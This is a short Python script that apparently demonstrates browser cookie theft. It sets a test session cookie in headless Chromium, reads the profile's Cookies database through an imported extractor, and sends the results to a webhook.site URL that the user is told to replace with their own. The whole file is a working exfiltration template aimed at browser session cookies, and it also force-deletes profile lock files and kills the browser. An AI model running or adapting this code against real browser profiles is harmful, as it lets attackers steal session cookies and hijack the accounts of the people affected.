import subprocess
import time
from cookie_extractor import extract_cookies
from exfil_payload import exfil_to_webhook

CHROMIUM_PROFILE = "/root/chrome_profile"
CHROMIUM_DB = f"{CHROMIUM_PROFILE}/Default/Cookies"
WEBHOOK_URL = "https://webhook.site/your-custom-id"  # ← REPLACE THIS with your actual webhook

def drop_cookie():
    print("[*] Dropping session cookie with Chromium...")
    subprocess.call(f"rm -rf {CHROMIUM_PROFILE}/Singleton*", shell=True)

    cmd = [
        "chromium",
        "--headless",
        "--disable-gpu",
        "--no-sandbox",
        f"--user-data-dir={CHROMIUM_PROFILE}",
        "https://httpbin.org/cookies/set?sessionid=987654321"
    ]

    subprocess.Popen(cmd)
    time.sleep(3)
    subprocess.call("pkill chromium", shell=True)

def run():
    drop_cookie()
    print(f"[*] Extracting cookies from {CHROMIUM_DB}...")
    cookies = extract_cookies(CHROMIUM_DB)
    print(f"[*] Exfiltrating to {WEBHOOK_URL}...")
    exfil_to_webhook(cookies, WEBHOOK_URL)

if __name__ == "__main__":
    run()
